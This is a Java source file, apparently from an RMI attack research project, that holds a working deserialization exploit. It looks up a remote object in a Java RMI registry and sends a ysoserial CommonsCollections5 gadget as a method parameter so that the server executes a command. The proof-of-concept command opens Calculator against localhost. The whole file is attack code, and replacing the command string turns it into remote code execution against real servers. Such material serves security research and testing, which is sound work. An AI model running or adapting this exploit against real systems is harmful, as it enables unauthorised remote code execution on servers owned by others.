package com.wu.attackRmi.Exploit;

import com.wu.attackRmi.utils.KMPMatch;
import ysoserial.payloads.CommonsCollections5;
import com.wu.attackRmi.utils.Stub;
import com.wu.attackRmi.utils.ComputeMethodHash;

import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.rmi.server.ObjID;

public class AttackServerByNonPrimitiveParameter {
    public static void main(String[] args) throws Exception {
        String registryHost  = "127.0.0.1";
        int registryPort = 1099;
//        String name = "hello";
//        String methodSignature = "sayHello(Ljava/lang/String;)Ljava/lang/String;";
        String name = "two";
        String methodSignature = "helloman(Ljava/util/HashMap;)I";
        String cmd = "open /System/Applications/Calculator.app";
        Object payloadObject = new CommonsCollections5().getObject(cmd);

        attack(registryHost, registryPort, name, methodSignature, payloadObject);
    }

    public static void attack(String registryHost, int registryPort, String lookupName, String methodSignature, Object payloadObject) throws Exception{
        ObjID objID_ = new ObjID(0);
        //Lookup
        byte[] returnData = Stub.exploit(registryHost, registryPort, lookupName, objID_, 2, 4905912898345647071L);

        int index = KMPMatch.indexOf(returnData, "UnicastRef".getBytes());
        byte [] serializationData = new byte[6+returnData.length-index-10];
        serializationData[0] = (byte)0xac;
        serializationData[1] = (byte)0xed;
        serializationData[2] = (byte)0x00;
        serializationData[3] = (byte)0x05;
        serializationData[4] = (byte)0x77; // TC_BLOCKDATA
        serializationData[5] = (byte)(returnData.length-index-10); //Length
        System.arraycopy(returnData, index+10, serializationData, 6, returnData.length-index-10);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serializationData);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        String tcp_host = objectInputStream.readUTF();
        int tcp_port = objectInputStream.readInt();
        ObjID objID = ObjID.read(objectInputStream);
        long hash = ComputeMethodHash.computeMethodHash(methodSignature);
        Stub.exploit(tcp_host, tcp_port, payloadObject, objID,-1, hash);
    }
}
